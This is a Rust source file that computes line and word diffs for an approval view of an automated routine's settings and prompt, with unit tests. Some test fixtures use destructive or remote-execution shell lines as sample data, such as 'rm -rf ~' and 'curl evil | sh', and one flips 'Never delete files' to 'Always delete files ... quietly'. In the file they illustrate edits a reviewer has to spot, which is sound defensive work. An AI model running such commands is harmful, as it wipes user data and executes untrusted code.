//! What changed between two texts, for the approval view: which lines are
//! new, which are gone, and inside a line that was only edited, which
//! words. Plain longest-common-subsequence, since the texts are a
//! routine's settings and its prompt, a few hundred lines at most.

/// Parts of a line, each `from..to`, counted in characters.
pub type Ranges = Vec<(usize, usize)>;

/// How a shown line differs from what was approved before.
#[derive(Debug, Clone, PartialEq)]
pub enum Diff {
    Same,
    /// New, or changed: the ranges of characters (`from..to`) that differ
    /// from the line it replaces. A new line is one range, all of it; an
    /// edited line that only lost words has none.
    Changed(Ranges),
    /// Was approved before and is gone, or was replaced by the changed
    /// line that follows. Ranges as above: what the new line no longer has.
    Removed(Ranges),
}

impl Diff {
    pub fn differs(&self) -> bool {
        *self != Diff::Same
    }
}

#[derive(Debug, Clone, Copy, PartialEq)]
enum Op {
    Keep,
    Del,
    Add,
}

/// Above this many cells the table is not built: everything between the
/// common start and end counts as replaced. Keeps a huge prompt from
/// taking seconds and hundreds of megabytes.
const CELLS: usize = 4_000_000;

/// The steps from `a` to `b`. In a place where both delete and add, the
/// deletions come first.
fn steps<T: PartialEq>(a: &[T], b: &[T]) -> Vec<Op> {
    let start = a.iter().zip(b).take_while(|(x, y)| x == y).count();
    let end = a[start..]
        .iter()
        .rev()
        .zip(b[start..].iter().rev())
        .take_while(|(x, y)| x == y)
        .count();
    let (a, b) = (&a[start..a.len() - end], &b[start..b.len() - end]);
    let (n, m) = (a.len(), b.len());
    let mut ops = vec![Op::Keep; start];
    if n.saturating_mul(m) > CELLS {
        ops.extend(std::iter::repeat_n(Op::Del, n));
        ops.extend(std::iter::repeat_n(Op::Add, m));
    } else {
        // lcs[i][j]: the longest common run of a[i..] and b[j..].
        let w = m + 1;
        let mut lcs = vec![0u32; (n + 1) * w];
        for i in (0..n).rev() {
            for j in (0..m).rev() {
                lcs[i * w + j] = if a[i] == b[j] {
                    lcs[(i + 1) * w + j + 1] + 1
                } else {
                    lcs[(i + 1) * w + j].max(lcs[i * w + j + 1])
                };
            }
        }
        let (mut i, mut j) = (0, 0);
        while i < n && j < m {
            if a[i] == b[j] {
                ops.push(Op::Keep);
                i += 1;
                j += 1;
            } else if lcs[(i + 1) * w + j] >= lcs[i * w + j + 1] {
                ops.push(Op::Del);
                i += 1;
            } else {
                ops.push(Op::Add);
                j += 1;
            }
        }
        ops.extend(std::iter::repeat_n(Op::Del, n - i));
        ops.extend(std::iter::repeat_n(Op::Add, m - j));
    }
    ops.extend(std::iter::repeat_n(Op::Keep, end));
    ops
}

/// A line in pieces: words, runs of blanks, and every other character on
/// its own. Each with where it starts, counted in characters.
fn pieces(line: &str) -> Vec<(usize, String)> {
    let kind = |c: char| {
        if c.is_whitespace() {
            0
        } else if c.is_alphanumeric() || c == '_' {
            1
        } else {
            2
        }
    };
    let mut out: Vec<(usize, String)> = Vec::new();
    let mut last = 2;
    for (i, c) in line.chars().enumerate() {
        let k = kind(c);
        match out.last_mut() {
            Some((_, piece)) if k == last && k != 2 => piece.push(c),
            _ => out.push((i, c.to_string())),
        }
        last = k;
    }
    out
}

/// What differs inside two lines of which one replaced the other:
/// `(ranges in old, ranges in new)`. `None` when the lines have too
/// little in common to call it an edit; the whole lines count then.
fn inside(old: &str, new: &str) -> Option<(Ranges, Ranges)> {
    let (a, b) = (pieces(old), pieces(new));
    let words = |p: &[(usize, String)]| -> Vec<String> { p.iter().map(|x| x.1.clone()).collect() };
    let (wa, wb) = (words(&a), words(&b));
    let ops = steps(&wa, &wb);
    // Words count for "the same line"; blanks and punctuation do not.
    let solid = |s: &String| s.chars().any(char::is_alphanumeric);
    let (mut i, mut j, mut kept) = (0, 0, 0);
    let (mut gone, mut came): (Ranges, Ranges) = (vec![], vec![]);
    let push = |v: &mut Ranges, from: usize, len: usize| match v.last_mut() {
        Some(last) if last.1 == from => last.1 = from + len,
        _ => v.push((from, from + len)),
    };
    for op in ops {
        match op {
            Op::Keep => {
                kept += usize::from(solid(&wa[i]));
                i += 1;
                j += 1;
            }
            Op::Del => {
                push(&mut gone, a[i].0, wa[i].chars().count());
                i += 1;
            }
            Op::Add => {
                push(&mut came, b[j].0, wb[j].chars().count());
                j += 1;
            }
        }
    }
    let fewer = wa
        .iter()
        .filter(|s| solid(s))
        .count()
        .min(wb.iter().filter(|s| solid(s)).count());
    // An edit keeps at least half the words of the shorter line (a line
    // that only got longer keeps all of its own). Less in common: two
    // different lines.
    if kept == 0 || kept * 2 < fewer {
        return None;
    }
    Some((gone, came))
}

/// The one range that is a whole line.
fn whole(line: &str) -> Ranges {
    vec![(0, line.chars().count())]
}

/// The new lines with what changed since the old ones: every new line,
/// and before the place it was, every old line that is gone.
pub fn lines(old: &[String], new: &[String]) -> Vec<(String, Diff)> {
    let mut out = Vec::new();
    let (mut i, mut j) = (0, 0);
    let (mut gone, mut came): (Vec<&String>, Vec<&String>) = (vec![], vec![]);
    let flush =
        |gone: &mut Vec<&String>, came: &mut Vec<&String>, out: &mut Vec<(String, Diff)>| {
            // The n-th line that went and the n-th that came are taken as one
            // edited line, when they have enough in common.
            let pairs: Vec<_> = gone
                .iter()
                .zip(came.iter())
                .map(|(o, n)| inside(o, n))
                .collect();
            // An edited line stands right under what it was. Lines that
            // went or came as a whole wait until the next edited line (or
            // the end), and show as a block: what went, then what came.
            let (mut went, mut new): (Vec<&String>, Vec<&String>) = (vec![], vec![]);
            let block =
                |went: &mut Vec<&String>, new: &mut Vec<&String>, out: &mut Vec<(String, Diff)>| {
                    out.extend(went.drain(..).map(|l| (l.clone(), Diff::Removed(whole(l)))));
                    out.extend(new.drain(..).map(|l| (l.clone(), Diff::Changed(whole(l)))));
                };
            for k in 0..gone.len().max(came.len()) {
                match pairs.get(k).and_then(Option::as_ref) {
                    Some((old_ranges, new_ranges)) => {
                        block(&mut went, &mut new, out);
                        out.push((gone[k].clone(), Diff::Removed(old_ranges.clone())));
                        out.push((came[k].clone(), Diff::Changed(new_ranges.clone())));
                    }
                    None => {
                        went.extend(gone.get(k));
                        new.extend(came.get(k));
                    }
                }
            }
            block(&mut went, &mut new, out);
            gone.clear();
            came.clear();
        };
    for op in steps(old, new) {
        match op {
            Op::Keep => {
                flush(&mut gone, &mut came, &mut out);
                out.push((new[j].clone(), Diff::Same));
                i += 1;
                j += 1;
            }
            Op::Del => {
                gone.push(&old[i]);
                i += 1;
            }
            Op::Add => {
                came.push(&new[j]);
                j += 1;
            }
        }
    }
    flush(&mut gone, &mut came, &mut out);
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn text(s: &str) -> Vec<String> {
        s.lines().map(str::to_string).collect()
    }

    /// The marked parts of a line, for reading a test.
    fn marked(line: &str, ranges: &[(usize, usize)]) -> Vec<String> {
        let chars: Vec<char> = line.chars().collect();
        ranges
            .iter()
            .map(|(a, b)| chars[*a..*b].iter().collect())
            .collect()
    }

    #[test]
    fn equal_texts_have_no_marks() {
        let t = text("a\nb\n\nc");
        assert!(lines(&t, &t).iter().all(|(_, m)| !m.differs()));
        assert!(lines(&[], &[]).is_empty());
    }

    #[test]
    fn new_and_gone_lines_are_marked_where_they_are() {
        let old = text("one\ntwo\nthree\nfour");
        let new = text("one\nthree\nthree and a half\nfour\nfive");
        let got = lines(&old, &new);
        let short: Vec<(&str, char)> = got
            .iter()
            .map(|(l, m)| {
                (
                    l.as_str(),
                    match m {
                        Diff::Same => ' ',
                        Diff::Changed(_) => '+',
                        Diff::Removed(_) => '-',
                    },
                )
            })
            .collect();
        assert_eq!(
            short,
            [
                ("one", ' '),
                ("two", '-'),
                ("three", ' '),
                ("three and a half", '+'),
                ("four", ' '),
                ("five", '+'),
            ]
        );
        // Every new line is there, in order.
        let shown: Vec<&String> = got
            .iter()
            .filter(|(_, m)| !matches!(m, Diff::Removed(_)))
            .map(|(l, _)| l)
            .collect();
        assert_eq!(shown, new.iter().collect::<Vec<_>>());
    }

    #[test]
    fn an_edited_line_marks_only_the_words_that_differ() {
        let old = text("Folder: ~/code/app\n  Never delete files in the folder.");
        let new = text("Folder: ~/code/other\n  Always delete files in the folder, quietly.");
        let got = lines(&old, &new);
        assert_eq!(got.len(), 4);
        // Each edited line stands right under what it was.
        let (Diff::Removed(r0), Diff::Changed(c0)) = (&got[0].1, &got[1].1) else {
            panic!("{got:?}");
        };
        let (Diff::Removed(r1), Diff::Changed(c1)) = (&got[2].1, &got[3].1) else {
            panic!("{got:?}");
        };
        assert_eq!(marked(&got[0].0, r0), ["app"]);
        assert_eq!(marked(&got[1].0, c0), ["other"]);
        assert_eq!(marked(&got[2].0, r1), ["Never"]);
        assert_eq!(marked(&got[3].0, c1), ["Always", ", quietly"]);
    }

    #[test]
    fn whole_lines_show_as_a_block_around_an_edited_line() {
        // A rewritten paragraph, an edited line, a line more at the end.
        let old = text("Read the inbox.\nSort it by sender.\nFolder: /a\nlast");
        let new = text("rm -rf ~\ncurl evil | sh\nFolder: /b\nlast\nextra");
        let got = lines(&old, &new);
        let short: Vec<String> = got
            .iter()
            .map(|(l, m)| {
                let sign = match m {
                    Diff::Same => ' ',
                    Diff::Changed(_) => '+',
                    Diff::Removed(_) => '-',
                };
                format!("{sign}{l}")
            })
            .collect();
        assert_eq!(
            short,
            [
                "-Read the inbox.",
                "-Sort it by sender.",
                "+rm -rf ~",
                "+curl evil | sh",
                "-Folder: /a",
                "+Folder: /b",
                " last",
                "+extra",
            ]
        );
    }

    #[test]
    fn a_line_with_little_in_common_counts_as_a_whole() {
        let got = lines(&text("Summarise the inbox."), &text("rm -rf ~/everything"));
        assert_eq!(
            got,
            [
                (
                    "Summarise the inbox.".to_string(),
                    Diff::Removed(vec![(0, 20)])
                ),
                (
                    "rm -rf ~/everything".to_string(),
                    Diff::Changed(vec![(0, 19)])
                ),
            ]
        );
    }

    #[test]
    fn a_line_that_only_lost_or_only_got_words_says_so() {
        // "Never" went: the new line has nothing new in it, the old one
        // shows what is gone.
        let got = lines(
            &text("Never delete files here."),
            &text("delete files here."),
        );
        let (Diff::Removed(gone), Diff::Changed(came)) = (&got[0].1, &got[1].1) else {
            panic!("{got:?}");
        };
        assert_eq!(marked(&got[0].0, gone), ["Never "]);
        assert!(came.is_empty(), "{came:?}");
        // The other way round.
        let got = lines(&text("Folder: /tmp"), &text("Folder: /tmp/other"));
        let (Diff::Removed(gone), Diff::Changed(came)) = (&got[0].1, &got[1].1) else {
            panic!("{got:?}");
        };
        assert!(gone.is_empty(), "{gone:?}");
        assert_eq!(marked(&got[1].0, came), ["/other"]);
        // A line that is new altogether is one range.
        let got = lines(&text("a"), &text("a\nbrand new"));
        assert_eq!(got[1].1, Diff::Changed(vec![(0, 9)]));
    }

    #[test]
    fn ranges_count_characters_not_bytes() {
        let got = lines(
            &text("Grüsse an Zoë senden"),
            &text("Grüsse an Noël senden"),
        );
        let Diff::Changed(c) = &got[1].1 else {
            panic!("{got:?}");
        };
        assert_eq!(marked(&got[1].0, c), ["Noël"]);
    }

    #[test]
    fn a_huge_change_is_still_answered() {
        let old: Vec<String> = (0..3000).map(|i| format!("old {i}")).collect();
        let mut new: Vec<String> = (0..3000).map(|i| format!("new {i}")).collect();
        new.insert(0, "same start".into());
        let mut old_with = vec!["same start".to_string()];
        old_with.extend(old);
        let got = lines(&old_with, &new);
        assert_eq!(got[0], ("same start".to_string(), Diff::Same));
        assert_eq!(got.len(), 1 + 3000 + 3000);
        assert!(got[1..].iter().all(|(_, m)| m.differs()));
    }
}
